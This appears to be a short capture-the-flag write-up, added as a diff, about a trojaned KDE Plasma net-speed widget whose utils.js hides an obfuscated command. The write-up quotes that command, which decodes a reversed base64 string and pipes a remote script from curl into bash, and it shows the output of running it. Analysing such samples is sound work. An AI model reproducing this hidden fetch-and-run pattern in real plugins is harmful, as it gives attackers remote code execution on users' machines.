@@ -1,0 +1,7 @@
+In the plasma/plasmoids/org.kde.netspeedWidget/contents/ui/config directory I found that the .qml files are calling out to ../../code/utils.js files
+From there I cat out that utils.js file and found this line in the code:
+  "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
+
+Running the line of code I get the out put of:
+  zsh: command not found: HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}
+  curl: (3) URL rejected: No host part in the URL
